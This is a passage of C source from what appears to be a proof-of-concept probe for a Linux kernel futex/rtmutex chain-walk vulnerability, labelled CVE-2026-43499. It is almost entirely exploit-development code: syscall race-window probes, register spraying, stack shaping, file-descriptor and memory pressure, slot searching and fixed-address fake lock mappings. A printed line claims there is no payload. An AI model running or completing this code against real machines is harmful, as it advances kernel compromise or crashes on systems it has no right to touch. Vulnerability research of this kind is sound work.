    __atomic_store_n(&waiter_post_return_last_errno,
                     submit_ret < 0 ? submit_err : 0, __ATOMIC_RELEASE);
    __atomic_store_n(&waiter_post_return_last_duration_us, -1,
                     __ATOMIC_RELEASE);

    asm volatile("" : : "r"(&cb), "r"(&cbp), "r"(scratch),
                 "r"(submit_ret) : "memory");

    if (submit_ret == 1 ||
        (submit_ret < 0 && (submit_err == EINVAL || submit_err == EBADF))) {
        return 0;
    }

    errno = submit_ret < 0 ? submit_err : EIO;
    return -1;
}

static int waiter_post_return_process_vm_probe(int do_writev)
{
    enum {
        iov_count = 16,
    };
    const size_t total_len = (size_t)process_vm_mb * 1024U * 1024U;
    const size_t base_chunk = total_len / iov_count;
    uint8_t *local = MAP_FAILED;
    uint8_t *remote = MAP_FAILED;
    struct iovec local_iov[iov_count];
    struct iovec remote_iov[iov_count];
    struct timespec start_ts;
    struct timespec end_ts;
    long duration_us = -1;
    ssize_t n;
    int saved_errno;

    local = mmap(NULL, total_len, PROT_READ | PROT_WRITE,
                 MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (local == MAP_FAILED) {
        return -1;
    }
    remote = mmap(NULL, total_len, PROT_READ | PROT_WRITE,
                  MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (remote == MAP_FAILED) {
        saved_errno = errno;
        munmap(local, total_len);
        errno = saved_errno;
        return -1;
    }

    memset(local, do_writev ? 0x56 : 0, total_len);
    memset(remote, do_writev ? 0 : 0x76, total_len);
    for (int i = 0; i < iov_count; i++) {
        size_t off = (size_t)i * base_chunk;
        size_t len = (i + 1 == iov_count) ? (total_len - off) : base_chunk;
        local_iov[i].iov_base = local + off;
        local_iov[i].iov_len = len;
        remote_iov[i].iov_base = remote + off;
        remote_iov[i].iov_len = len;
    }

    printf("[W] post-return process-vm-%s prepared total=%zu local_iov=%p remote_iov=%p local=%p remote=%p\n",
           do_writev ? "writev" : "readv",
           total_len, (void *)local_iov, (void *)remote_iov,
           (void *)local, (void *)remote);
    fflush(stdout);

    /*
     * Publish immediately before entering process_vm_rw(). The static writer
     * window is inside process_vm_rw(), after local import_iovec and before
     * process_vm_rw_core returns.
     */
    __atomic_store_n(&waiter_post_return_probe_failures, 0, __ATOMIC_RELEASE);
    __atomic_store_n(&waiter_churn_failures_seen, 0, __ATOMIC_RELEASE);
    __atomic_store_n(&waiter_churn_progress, 0, __ATOMIC_RELEASE);
    __atomic_store_n(&waiter_churn_done, 1, __ATOMIC_RELEASE);
    __atomic_store_n(&waiter_post_return_probe_done, 1, __ATOMIC_RELEASE);

    errno = 0;
    (void)clock_gettime(CLOCK_MONOTONIC, &start_ts);
    if (do_writev) {
        n = syscall(SYS_process_vm_writev, getpid(),
                    local_iov, iov_count, remote_iov, iov_count, 0);
    } else {
        n = syscall(SYS_process_vm_readv, getpid(),
                    local_iov, iov_count, remote_iov, iov_count, 0);
    }
    saved_errno = errno;
    if (clock_gettime(CLOCK_MONOTONIC, &end_ts) == 0) {
        duration_us = (end_ts.tv_sec - start_ts.tv_sec) * 1000000L +
                      (end_ts.tv_nsec - start_ts.tv_nsec) / 1000L;
    }

    printf("[W] post-return process-vm-%s ret=%zd errno=%d duration_us=%ld total=%zu\n",
           do_writev ? "writev" : "readv",
           n, n < 0 ? saved_errno : 0, duration_us, total_len);
    fflush(stdout);

    asm volatile("" : : "r"(local), "r"(remote), "r"(local_iov),
                 "r"(remote_iov), "r"(n) : "memory");

    if (n == (ssize_t)total_len) {
        return 0;
    }

    errno = n < 0 ? saved_errno : EIO;
    return -1;
}

static int waiter_post_return_sched_affinity_probe(int loop_mode)
{
    unsigned long current_mask = 0;
    unsigned long target_mask = 0;
    unsigned long alt_mask = 0;
    unsigned int current_cpu = UINT_MAX;
    unsigned int current_node = UINT_MAX;
    unsigned long current_cpu_mask = 0;
    struct timespec all_start_ts;
    struct timespec all_end_ts;
    struct timespec one_start_ts;
    struct timespec one_end_ts;
    long total_duration_us = -1;
    long max_one_us = -1;
    long loop_budget_us = waiter_hold_ms > 0 ? waiter_hold_ms * 1000L : 1000L;
    int loops = 0;
    int failures = 0;
    long ret;
    int saved_errno;

    ret = syscall(SYS_sched_getaffinity, gettid_long(),
                  sizeof(current_mask), &current_mask);
    if (ret < 0 || current_mask == 0) {
        return -1;
    }

    (void)syscall(SYS_getcpu, &current_cpu, &current_node, NULL);
    if (current_cpu < sizeof(current_mask) * CHAR_BIT) {
        current_cpu_mask = 1UL << current_cpu;
    }
    for (unsigned int bit = 0; bit < sizeof(current_mask) * CHAR_BIT; bit++) {
        unsigned long bit_mask = 1UL << bit;
        if ((current_mask & bit_mask) && bit_mask != current_cpu_mask) {
            target_mask = bit_mask;
            break;
        }
    }
    if (target_mask == 0) {
        target_mask = current_mask & (~current_mask + 1UL);
    }
    if ((current_mask & current_cpu_mask) != 0) {
        alt_mask = current_cpu_mask;
    }
    if (alt_mask == 0 || alt_mask == target_mask) {
        for (unsigned int bit = 0; bit < sizeof(current_mask) * CHAR_BIT; bit++) {
            unsigned long bit_mask = 1UL << bit;
            if ((current_mask & bit_mask) && bit_mask != target_mask) {
                alt_mask = bit_mask;
                break;
            }
        }
    }
    if (alt_mask == 0) {
        alt_mask = target_mask;
    }
    if (loop_budget_us < 1000) {
        loop_budget_us = 1000;
    }

    printf("[W] post-return %s prepared current_cpu=%u current_node=%u current_mask=0x%016lx current_cpu_mask=0x%016lx target_mask=0x%016lx alt_mask=0x%016lx migrate=%d loop_budget_us=%ld\n",
           loop_mode ? "sched-affinity-loop" : "sched-affinity",
           current_cpu, current_node, current_mask, current_cpu_mask, target_mask,
           alt_mask, (target_mask != 0 && target_mask != current_cpu_mask),
           loop_budget_us);
    fflush(stdout);

    /*
     * Publish immediately before sched_setaffinity. The static writer is in
     * the completion wait path that may run while the affinity update is
     * synchronized with the scheduler.
     */
    __atomic_store_n(&waiter_post_return_probe_failures, 0, __ATOMIC_RELEASE);
    __atomic_store_n(&waiter_churn_failures_seen, 0, __ATOMIC_RELEASE);
    __atomic_store_n(&waiter_churn_progress, 0, __ATOMIC_RELEASE);
    __atomic_store_n(&waiter_churn_done, 1, __ATOMIC_RELEASE);
    __atomic_store_n(&waiter_post_return_probe_done, 1, __ATOMIC_RELEASE);

    errno = 0;
    (void)clock_gettime(CLOCK_MONOTONIC, &all_start_ts);
    do {
        unsigned long next_mask = (loops & 1) ? alt_mask : target_mask;
        long one_us = -1;

        (void)clock_gettime(CLOCK_MONOTONIC, &one_start_ts);
        ret = syscall(SYS_sched_setaffinity, gettid_long(),
                      sizeof(next_mask), &next_mask);
        saved_errno = errno;
        if (clock_gettime(CLOCK_MONOTONIC, &one_end_ts) == 0) {
            one_us = (one_end_ts.tv_sec - one_start_ts.tv_sec) * 1000000L +
                     (one_end_ts.tv_nsec - one_start_ts.tv_nsec) / 1000L;
        }
        if (one_us > max_one_us) {
            max_one_us = one_us;
        }
        loops++;
        if (ret < 0) {
            failures++;
            break;
        }
        if (clock_gettime(CLOCK_MONOTONIC, &all_end_ts) == 0) {
            total_duration_us =
                (all_end_ts.tv_sec - all_start_ts.tv_sec) * 1000000L +
                (all_end_ts.tv_nsec - all_start_ts.tv_nsec) / 1000L;
        }
    } while (loop_mode && total_duration_us < loop_budget_us && loops < 10000);

    (void)syscall(SYS_sched_setaffinity, gettid_long(),
                  sizeof(current_mask), &current_mask);
    if (clock_gettime(CLOCK_MONOTONIC, &all_end_ts) == 0) {
        total_duration_us =
            (all_end_ts.tv_sec - all_start_ts.tv_sec) * 1000000L +
            (all_end_ts.tv_nsec - all_start_ts.tv_nsec) / 1000L;
    }

    printf("[W] post-return %s ret=%ld errno=%d duration_us=%ld loops=%d failures=%d max_one_us=%ld target_mask=0x%016lx alt_mask=0x%016lx restored_mask=0x%016lx\n",
           loop_mode ? "sched-affinity-loop" : "sched-affinity",
           failures ? -1L : 0L, failures ? saved_errno : 0,
           total_duration_us, loops, failures, max_one_us, target_mask,
           alt_mask, current_mask);
    fflush(stdout);

    asm volatile("" : : "r"(current_mask), "r"(target_mask), "r"(alt_mask),
                 "r"(ret), "r"(loops) : "memory");
    errno = failures ? saved_errno : 0;
    return failures ? -1 : 0;
}

static void waiter_seccomp_getppid_loop(long hold_ms)
{
    volatile unsigned long long spins = (unsigned long long)hold_ms * 50000ULL;
    unsigned long long failures = 0;

    while (spins-- > 0) {
        errno = 0;
        long ret = syscall(SYS_getppid);
        if (!(ret == -1 && errno == (int)SECCOMP_ERRNO_MARKER)) {
            failures++;
        }
    }
    printf("[W] seccomp getppid loop done failures=%llu expected_errno=%u\n",
           failures, SECCOMP_ERRNO_MARKER);
    fflush(stdout);
}

static void waiter_seccomp_getppid_passthrough_loop(long hold_ms,
                                                    const char *action_name,
                                                    unsigned int action,
                                                    unsigned int marker)
{
    volatile unsigned long long spins = (unsigned long long)hold_ms * 50000ULL;
    unsigned long long failures = 0;
    long last_ret = 0;
    int last_errno = 0;

    while (spins-- > 0) {
        errno = 0;
        last_ret = syscall(SYS_getppid);
        last_errno = errno;
        if (last_ret < 0 || last_errno != 0) {
            failures++;
        }
    }
    printf("[W] seccomp %s getppid loop done failures=%llu last_ret=%ld last_errno=%d action=0x%08x marker=0x%04x\n",
           action_name, failures, last_ret, last_errno, action, marker);
    fflush(stdout);
}

static void waiter_seccomp_getppid_log_loop(long hold_ms)
{
    waiter_seccomp_getppid_passthrough_loop(hold_ms, "log",
                                            SECCOMP_LOG_ACTION,
                                            SECCOMP_LOG_MARKER);
}

static void waiter_seccomp_getppid_allowmark_loop(long hold_ms)
{
    waiter_seccomp_getppid_passthrough_loop(hold_ms, "allowmark",
                                            SECCOMP_ALLOW_MARKED_ACTION,
                                            SECCOMP_ALLOW_MARKER);
}

static void waiter_getpid_loop(long hold_ms)
{
    struct timespec start_ts;
    struct timespec now_ts;
    unsigned long long failures = 0;
    long elapsed_ms = 0;

    if (clock_gettime(CLOCK_MONOTONIC, &start_ts) != 0) {
        failures++;
        hold_ms = 0;
    }
    while (elapsed_ms < hold_ms) {
        if (syscall(SYS_getpid) <= 0) {
            failures++;
        }
        if (clock_gettime(CLOCK_MONOTONIC, &now_ts) != 0) {
            failures++;
            break;
        }
        elapsed_ms = (now_ts.tv_sec - start_ts.tv_sec) * 1000L +
                     (now_ts.tv_nsec - start_ts.tv_nsec) / 1000000L;
    }
    printf("[W] getpid hold loop done failures=%llu elapsed_ms=%ld\n",
           failures, elapsed_ms);
    fflush(stdout);
}

static void waiter_getuid_loop(void)
{
    unsigned long long iterations = 0;
    unsigned long long failures = 0;

    while (!__atomic_load_n(&finish_waiter, __ATOMIC_ACQUIRE)) {
        if (syscall(SYS_getuid) < 0) {
            failures++;
        }
        iterations++;
    }
    printf("[W] getuid leaf hold loop done iterations=%llu failures=%llu\n",
           iterations, failures);
    fflush(stdout);
}

static int waiter_isolated_hold_prepare(void)
{
    if (waiter_isolated_hold_mode_is("futexwaittag")) {
        if (slotsearch_init_region() != 0) {
            return -1;
        }

        waiter_isolated_hold_futex_tag = (uint32_t *)slotsearch_region;
        __atomic_store_n(waiter_isolated_hold_futex_tag, 0, __ATOMIC_RELEASE);
        printf("[W] isolated_hold futexwaittag tag=%p tag_value=0x%016llx word=%u\n",
               (void *)waiter_isolated_hold_futex_tag,
               (unsigned long long)(uintptr_t)waiter_isolated_hold_futex_tag,
               __atomic_load_n(waiter_isolated_hold_futex_tag, __ATOMIC_ACQUIRE));
        fflush(stdout);
        return 0;
    }

    if (waiter_isolated_hold_mode_is("seccompgetppid")) {
        return install_waiter_seccomp_errno_filter();
    }

    if (waiter_isolated_hold_mode_is("seccompgetppidlog")) {
        return install_waiter_seccomp_log_filter();
    }

    if (waiter_isolated_hold_mode_is("seccompgetppidallowmark")) {
        return install_waiter_seccomp_allowmark_filter();
    }

    return 0;
}

static int run_waiter_post_return_probe_once(void)
{
    if (waiter_post_return_mode_is("quietspin")) {
        return 0;
    }

    if (waiter_post_return_mode_is("write")) {
        static const char msg[] = "[W] post-return probe=write\n";
        return write(STDOUT_FILENO, msg, sizeof(msg) - 1) == (ssize_t)(sizeof(msg) - 1) ? 0 : -1;
    }

    if (waiter_post_return_mode_is("yield")) {
        return sched_yield();
    }

    if (waiter_post_return_mode_is("gettid")) {
        return syscall(SYS_gettid) < 0 ? -1 : 0;
    }

    if (waiter_post_return_mode_is("clock")) {
        struct timespec ts;
        return clock_gettime(CLOCK_MONOTONIC, &ts);
    }

    if (waiter_post_return_mode_is("nanosleep")) {
        struct timespec ts = {
            .tv_sec = 0,
            .tv_nsec = 1000,
        };
        return nanosleep(&ts, NULL) == 0 || errno == EINTR ? 0 : -1;
    }

    if (waiter_post_return_mode_is("futexwake")) {
        (void)xfutex(&futex1, F_WAKE, 1, NULL, NULL, 0);
        return 0;
    }

    if (waiter_post_return_mode_is("readlink")) {
        char buf[128];
        return readlink("/proc/self/exe", buf, sizeof(buf) - 1) < 0 ? -1 : 0;
    }

    if (waiter_post_return_mode_is("readv-small")) {
        return waiter_post_return_readv_probe(0);
    }

    if (waiter_post_return_mode_is("readv-large")) {
        return waiter_post_return_readv_probe(1);
    }

    if (waiter_post_return_mode_is("readv-block-small")) {
        return waiter_post_return_readv_block_probe(0);
    }

    if (waiter_post_return_mode_is("readv-block-large")) {
        return waiter_post_return_readv_block_probe(1);
    }

    if (waiter_post_return_mode_is("preadv-socket")) {
        return waiter_post_return_pos_iov_socket_probe(0);
    }

    if (waiter_post_return_mode_is("pwritev2-socket")) {
        return waiter_post_return_pos_iov_socket_probe(1);
    }

    if (waiter_post_return_mode_is("epoll-block")) {
        return waiter_post_return_epoll_block_probe();
    }

    if (waiter_post_return_mode_is("sendmsg-block")) {
        return waiter_post_return_sendmsg_block_probe(0, 0);
    }

    if (waiter_post_return_mode_is("sendmmsg-block")) {
        return waiter_post_return_sendmsg_block_probe(1, 0);
    }

    if (waiter_post_return_mode_is("sendmmsg-name-block")) {
        return waiter_post_return_sendmsg_block_probe(1, 1);
    }

    if (waiter_post_return_mode_is("sigsuspend-block")) {
        return waiter_post_return_sigsuspend_block_probe();
    }

    if (waiter_post_return_mode_is("io-submit-usercopy")) {
        return waiter_post_return_io_submit_usercopy_probe();
    }

    if (waiter_post_return_mode_is("pipe-read-io-submit")) {
        return waiter_post_return_pipe_read_io_submit_probe();
    }

    if (waiter_post_return_mode_is("process-vm-readv")) {
        return waiter_post_return_process_vm_probe(0);
    }

    if (waiter_post_return_mode_is("process-vm-writev")) {
        return waiter_post_return_process_vm_probe(1);
    }

    if (waiter_post_return_mode_is("sched-affinity")) {
        return waiter_post_return_sched_affinity_probe(0);
    }

    if (waiter_post_return_mode_is("sched-affinity-loop")) {
        return waiter_post_return_sched_affinity_probe(1);
    }

    if (waiter_post_return_mode_is("seccomperrno")) {
        return install_waiter_seccomp_errno_filter();
    }

    if (waiter_post_return_mode_is("seccomplog")) {
        return install_waiter_seccomp_log_filter();
    }

    if (waiter_post_return_mode_is("seccompallowmark")) {
        return install_waiter_seccomp_allowmark_filter();
    }

    errno = EINVAL;
    return -1;
}

static const char *waiter_churn_progress_mode_name(void)
{
    if (waiter_churn_progress_mode > 0) {
        return "each";
    }
    if (waiter_churn_progress_mode == 0) {
        return "final";
    }
    return "none";
}

static void run_waiter_churn(const char *phase)
{
    long failures = 0;
    struct timespec churn_start_ts;
    struct timespec churn_end_ts;
    long churn_duration_us = -1;

    __atomic_store_n(&waiter_churn_progress, 0, __ATOMIC_RELEASE);
    __atomic_store_n(&waiter_churn_started, 1, __ATOMIC_RELEASE);

    if (waiter_churn_iterations <= 0 || waiter_churn_mode_is("none")) {
        __atomic_store_n(&waiter_churn_failures_seen, 0, __ATOMIC_RELEASE);
        __atomic_store_n(&waiter_churn_progress, 0, __ATOMIC_RELEASE);
        __atomic_store_n(&waiter_churn_done, 1, __ATOMIC_RELEASE);
        return;
    }

    if (!quiet_waiter_churn) {
        printf("[W] churn phase=%s mode=%s iterations=%ld keep_fds=%ld starting\n",
               phase, waiter_churn_mode, waiter_churn_iterations,
               waiter_churn_keep_fds);
        fflush(stdout);
        (void)clock_gettime(CLOCK_MONOTONIC, &churn_start_ts);
    }

    for (long i = 0; i < waiter_churn_iterations; i++) {
        int rc = 0;

        if (waiter_churn_mode_is("syscall")) {
            (void)syscall(SYS_getpid);
            (void)clock_gettime(CLOCK_MONOTONIC, &(struct timespec){0});
            sched_yield();
        } else if (waiter_churn_mode_is("stack") ||
                   waiter_churn_mode_is("stackshape")) {
            rc = waiter_churn_stack_syscalls(i);
        } else if (waiter_churn_mode_is("regspray")) {
            rc = waiter_churn_regspray_syscalls(i);
        } else if (waiter_churn_mode_is("regsprayclean")) {
            rc = waiter_churn_regspray_clean_syscalls(i);
        } else if (waiter_churn_mode_is("fd")) {
            switch (i % 5) {
            case 0: rc = waiter_churn_make_pipe(); break;
            case 1: rc = waiter_churn_make_eventfd(); break;
            case 2: rc = waiter_churn_make_timerfd(); break;
            case 3: rc = waiter_churn_make_epoll(); break;
            default: rc = waiter_churn_make_socketpair(); break;
            }
        } else if (waiter_churn_mode_is("mix")) {
            switch (i % 6) {
            case 0: rc = waiter_churn_make_pipe(); break;
            case 1: rc = waiter_churn_make_eventfd(); break;
            case 2: rc = waiter_churn_make_timerfd(); break;
            case 3: rc = waiter_churn_make_epoll(); break;
            case 4: rc = waiter_churn_make_socketpair(); break;
            default: rc = waiter_churn_make_memfd(); break;
            }
        } else if (waiter_churn_mode_is("pressure")) {
            rc = waiter_churn_pressure_bundle(i);
        } else if (waiter_churn_mode_is("memfd")) {
            rc = waiter_churn_make_memfd_pressure();
        } else if (waiter_churn_mode_is("pipe")) {
            rc = waiter_churn_make_pipe_pressure();
        } else if (waiter_churn_mode_is("epoll")) {
            rc = waiter_churn_make_epoll_pressure();
        } else if (waiter_churn_mode_is("unix")) {
            rc = waiter_churn_make_unix_queue_pressure();
        } else if (waiter_churn_mode_is("slotsearch")) {
            rc = waiter_churn_slotsearch_syscalls(i);
        } else if (waiter_churn_mode_is("slotsearchlast")) {
            rc = waiter_churn_slotsearchlast_syscall(i);
        } else if (waiter_churn_mode_is("slotreadlinklast")) {
            rc = waiter_churn_slotreadlinklast_syscall(i);
        } else if (waiter_churn_mode_is("slotfutexwaithold")) {
            rc = waiter_churn_slotfutexwaithold_syscall(i);
        } else if (waiter_churn_mode_is("slotsendmsghold")) {
            rc = waiter_churn_slotsendmsghold_syscall(i);
        } else if (waiter_churn_mode_is("frameprobe")) {
            rc = waiter_churn_frameprobe_syscall(i);
        }

        if (rc != 0) {
            failures++;
            __atomic_store_n(&waiter_churn_failures_seen, failures,
                             __ATOMIC_RELEASE);
            printf("[W] churn iter=%ld failed errno=%d (%s)\n",
                   i, errno, strerror(errno));
            fflush(stdout);
        }

        if (waiter_churn_progress_mode > 0) {
            __atomic_store_n(&waiter_churn_progress, i + 1, __ATOMIC_RELEASE);
            if (waiter_churn_mode_is_slotlast() &&
                chainwalk_at_churn_iter > 0 &&
                i + 1 >= chainwalk_at_churn_iter) {
                while (!__atomic_load_n(&chainwalk_started, __ATOMIC_ACQUIRE) &&
                       !__atomic_load_n(&finish_waiter, __ATOMIC_ACQUIRE) &&
                       !__atomic_load_n(&probe_done, __ATOMIC_ACQUIRE)) {
                    cpu_relax_user();
                }
                busy_relax_for_hold_ms(waiter_hold_ms);
                break;
            }
            if (waiter_churn_mode_is_blocking_slotlast() &&
                chainwalk_at_churn_iter > 0 &&
                i + 1 >= chainwalk_at_churn_iter) {
                break;
            }
        }
    }

    if (waiter_churn_progress_mode == 0) {
        __atomic_store_n(&waiter_churn_progress, waiter_churn_iterations,
                         __ATOMIC_RELEASE);
    }
    if (!quiet_waiter_churn &&
        clock_gettime(CLOCK_MONOTONIC, &churn_end_ts) == 0) {
        churn_duration_us =
            (long)((churn_end_ts.tv_sec - churn_start_ts.tv_sec) * 1000000L +
                   (churn_end_ts.tv_nsec - churn_start_ts.tv_nsec) / 1000L);
    }
    if (!quiet_waiter_churn) {
        printf("[W] churn phase=%s done progress=%ld failures=%ld kept_fds=%zu duration_us=%ld\n",
               phase, __atomic_load_n(&waiter_churn_progress, __ATOMIC_ACQUIRE),
               failures, waiter_churn_fd_count, churn_duration_us);
        if (waiter_churn_mode_is("pressure") ||
            waiter_churn_mode_is("memfd") ||
            waiter_churn_mode_is("pipe") ||
            waiter_churn_mode_is("epoll") ||
            waiter_churn_mode_is("unix")) {
            printf("[W] pressure_stats memfd=%ld pipe=%ld eventfd=%ld timerfd=%ld epoll=%ld inotify=%ld socketpair=%ld devices=%ld bytes=%ld\n",
                   __atomic_load_n(&waiter_pressure_memfd_made, __ATOMIC_ACQUIRE),
                   __atomic_load_n(&waiter_pressure_pipe_made, __ATOMIC_ACQUIRE),
                   __atomic_load_n(&waiter_pressure_eventfd_made, __ATOMIC_ACQUIRE),
                   __atomic_load_n(&waiter_pressure_timerfd_made, __ATOMIC_ACQUIRE),
                   __atomic_load_n(&waiter_pressure_epoll_made, __ATOMIC_ACQUIRE),
                   __atomic_load_n(&waiter_pressure_inotify_made, __ATOMIC_ACQUIRE),
                   __atomic_load_n(&waiter_pressure_socketpair_made, __ATOMIC_ACQUIRE),
                   __atomic_load_n(&waiter_pressure_device_made, __ATOMIC_ACQUIRE),
                   __atomic_load_n(&waiter_pressure_bytes, __ATOMIC_ACQUIRE));
        }
    }
    __atomic_store_n(&waiter_churn_failures_seen, failures, __ATOMIC_RELEASE);
    __atomic_store_n(&waiter_churn_done, 1, __ATOMIC_RELEASE);
    if (!quiet_waiter_churn) {
        fflush(stdout);
    }
}

static void print_selinux(void)
{
    char buf[256];
    int fd = open("/proc/self/attr/current", O_RDONLY | O_CLOEXEC);
    if (fd < 0) {
        printf("[env] selinux=<open failed errno=%d (%s)>\n",
               errno, strerror(errno));
        return;
    }

    ssize_t n = read(fd, buf, sizeof(buf) - 1);
    close(fd);
    if (n < 0) {
        printf("[env] selinux=<read failed errno=%d (%s)>\n",
               errno, strerror(errno));
        return;
    }
    buf[n] = '\0';
    char *nl = strchr(buf, '\n');
    if (nl) {
        *nl = '\0';
    }
    printf("[env] selinux=%s\n", buf);
}

static void set_main_comm_marker(void)
{
    snprintf(main_comm_marker, sizeof(main_comm_marker),
             "cve43499_%ld", (long)getpid() % 100000L);
    if (prctl(PR_SET_NAME, (unsigned long)main_comm_marker, 0, 0, 0) != 0) {
        printf("[env] comm_marker=%s set_prctl_errno=%d (%s)\n",
               main_comm_marker, errno, strerror(errno));
        fflush(stdout);
        return;
    }
    printf("[env] comm_marker=%s\n", main_comm_marker);
}

static void print_env(void)
{
    struct utsname u;
    printf("=== cve_2026_43499_chainwalk_probe ===\n");
    if (uname(&u) == 0) {
        printf("[env] uname sys=%s release=%s machine=%s\n",
               u.sysname, u.release, u.machine);
    }
    printf("[env] uid=%ld gid=%ld pid=%ld tid=%ld\n",
           (long)getuid(), (long)getgid(), (long)getpid(), gettid_long());
    set_main_comm_marker();
    print_selinux();
    printf("[config] waiter_timeout_ms=%ld waiter_hold_ms=%ld idle_ms=%ld post_exit_delay_ms=%ld pre_chainwalk_delay_ms=%ld pre_chainwalk_delay_us=%ld watchdog_sec=%ld waiter_churn=%s quiet_waiter_churn=%d stackshape_case=%s frameprobe_case=%s main_final_shape=%s quiet_final=%d cycle_futex_mode=%s cycle_futex_offset=0x%lx cycle_futex_fixed_addr=0x%016llx regspray_value=0x%016llx stacktag_value=0x%016llx waiter_post_return=%s waiter_isolated_hold=%s waiter_adjust_pi_after_post_return=%d map_fixed_fake_lock=%d reuse_fixed_fake_lock_vma=%d fixed_fake_lock_addr=0x%016llx churn_iterations=%ld churn_keep_fds=%ld process_vm_mb=%ld churn_progress=%s chainwalk_after_churn=%d chainwalk_at_churn_iter=%ld chainwalk_raw_final=%d chainwalk_raw_timeout_ms=%ld chainwalk_raw_val3=0x%016llx stack_marker_telemetry=%ld\n",
           waiter_timeout_ms, waiter_hold_ms, idle_after_edeadlk_ms,
           post_waiter_exit_delay_ms, pre_chainwalk_delay_ms,
           pre_chainwalk_delay_us, watchdog_sec, waiter_churn_mode,
           quiet_waiter_churn, stackshape_case, frameprobe_case,
           main_final_shape, quiet_final,
           cycle_futex_mode, cycle_futex_offset,
           (unsigned long long)cycle_futex_fixed_addr,
           (unsigned long long)regspray_value,
           (unsigned long long)stacktag_value,
           waiter_post_return_mode, waiter_isolated_hold_mode,
           waiter_adjust_pi_after_post_return,
           map_fixed_fake_lock, reuse_fixed_fake_lock_vma,
           (unsigned long long)fixed_fake_lock_addr,
           waiter_churn_iterations, waiter_churn_keep_fds, process_vm_mb,
           waiter_churn_progress_mode_name(),
           chainwalk_after_churn, chainwalk_at_churn_iter,
           chainwalk_raw_final, chainwalk_raw_timeout_ms,
           (unsigned long long)chainwalk_raw_val3,
           stack_marker_telemetry_limit);
    printf("[addr] futex1=%p futex2=%p cycle_futex=%p values=%u/%u/%u\n",
           (void *)&futex1, (void *)&futex2, (void *)cycle_futex_ptr(),
           __atomic_load_n(&futex1, __ATOMIC_RELAXED),
           __atomic_load_n(&futex2, __ATOMIC_RELAXED),
           __atomic_load_n(cycle_futex_ptr(), __ATOMIC_RELAXED));
    print_cycle_futex_storage();
    printf("[note] gated futex/rtmutex probe: no payload, no fake waiter, no controlled stack reclaim.\n");
    fflush(stdout);
}

static int wait_flag_eq(const char *name, int *flag, int want, long timeout_ms)
{
    struct timespec start;
    clock_gettime(CLOCK_MONOTONIC, &start);

    for (;;) {
        int cur = __atomic_load_n(flag, __ATOMIC_ACQUIRE);
        if (cur == want) {
            return 0;
        }

        struct timespec now;
        clock_gettime(CLOCK_MONOTONIC, &now);
        long elapsed_ms = (now.tv_sec - start.tv_sec) * 1000L +
                          (now.tv_nsec - start.tv_nsec) / 1000000L;
        if (elapsed_ms > timeout_ms) {
            printf("[timeout] waiting for %s=%d current=%d after %ld ms\n",
                   name, want, cur, elapsed_ms);
            fflush(stdout);
            return -1;
        }
        sched_yield();
    }
}

static int wait_churn_progress_at_least(long want, long timeout_ms)
{
    struct timespec start;
    clock_gettime(CLOCK_MONOTONIC, &start);

    for (;;) {
        long progress = __atomic_load_n(&waiter_churn_progress, __ATOMIC_ACQUIRE);
        int done = __atomic_load_n(&waiter_churn_done, __ATOMIC_ACQUIRE);

        if (progress >= want) {
            return 0;
        }
        if (done) {
            printf("[stage] waiter churn finished before progress target: want=%ld current=%ld\n",
                   want, progress);
            fflush(stdout);
            return -1;
        }

        struct timespec now;
        clock_gettime(CLOCK_MONOTONIC, &now);
        long elapsed_ms = (now.tv_sec - start.tv_sec) * 1000L +
                          (now.tv_nsec - start.tv_nsec) / 1000000L;
        if (elapsed_ms > timeout_ms) {
            printf("[timeout] waiting for waiter_churn_progress>=%ld current=%ld done=%d after %ld ms\n",
                   want, progress, done, elapsed_ms);
            fflush(stdout);
            return -1;
        }
        sched_yield();
    }
}

static int wait_post_return_probe_if_needed(void)
{
    if (!waiter_post_return_isolated()) {
        return 0;
    }

    if (wait_flag_eq("waiter_post_return_probe_done",
                     &waiter_post_return_probe_done, 1, 2000) != 0) {
        printf("[stage] waiter post-return probe did not finish; refusing next gate\n");
        fflush(stdout);
        return -1;
    }

    printf("[stage] waiter post-return mode=%s probe_done=%d probe_failures=%d\n",
           waiter_post_return_mode,
           __atomic_load_n(&waiter_post_return_probe_done, __ATOMIC_ACQUIRE),
           __atomic_load_n(&waiter_post_return_probe_failures, __ATOMIC_ACQUIRE));
    if (waiter_post_return_mode_is("io-submit-usercopy") ||
        waiter_post_return_mode_is("pipe-read-io-submit")) {
        printf("[stage] %s ret=%ld errno=%d duration_us=%ld\n",
               waiter_post_return_mode,
               __atomic_load_n(&waiter_post_return_last_ret, __ATOMIC_ACQUIRE),
               __atomic_load_n(&waiter_post_return_last_errno, __ATOMIC_ACQUIRE),
               __atomic_load_n(&waiter_post_return_last_duration_us, __ATOMIC_ACQUIRE));
        if (waiter_post_return_mode_is("pipe-read-io-submit")) {
            printf("[stage] pipe-prime read_ret=%ld read_errno=%d write_ret=%ld write_errno=%d\n",
                   __atomic_load_n(&waiter_pipe_prime_read_ret, __ATOMIC_ACQUIRE),
                   __atomic_load_n(&waiter_pipe_prime_read_errno, __ATOMIC_ACQUIRE),
                   __atomic_load_n(&waiter_pipe_prime_write_ret, __ATOMIC_ACQUIRE),
                   __atomic_load_n(&waiter_pipe_prime_write_errno, __ATOMIC_ACQUIRE));
        }
    }
    fflush(stdout);
    return __atomic_load_n(&waiter_post_return_probe_failures,
                           __ATOMIC_ACQUIRE) == 0 ? 0 : -1;
}

static int trigger_waiter_adjust_pi_if_requested(void)
{
    long tid;

    if (!waiter_adjust_pi_after_post_return) {
        return 0;
    }

    if (adjust_pi_start_isolated_hold) {
        __atomic_store_n(&chainwalk_started, 1, __ATOMIC_RELEASE);
        if (waiter_post_return_isolated() &&
            !waiter_isolated_hold_mode_is("busy")) {
            if (wait_flag_eq("waiter_active_hold_started",
                             &waiter_active_hold_started, 1, 2000) != 0) {
                printf("[stage] adjust-pi isolated hold did not start; refusing sched_setattr\n");
                fflush(stdout);
                errno = ETIMEDOUT;
                return -1;
            }
            printf("[stage] adjust-pi isolated hold mode=%s active_hold_started=%d\n",
                   waiter_isolated_hold_mode,
                   __atomic_load_n(&waiter_active_hold_started,
                                   __ATOMIC_ACQUIRE));
            fflush(stdout);
        }
    }

    tid = __atomic_load_n(&waiter_tid_seen, __ATOMIC_ACQUIRE);
    if (tid <= 0) {
        printf("[stage] adjust-pi requested but waiter tid is unavailable\n");
        fflush(stdout);
        errno = ESRCH;
        return -1;
    }

    for (long attempt = 1; attempt <= waiter_adjust_pi_repeats; attempt++) {
        int nice = (attempt & 1) ? 1 : 2;
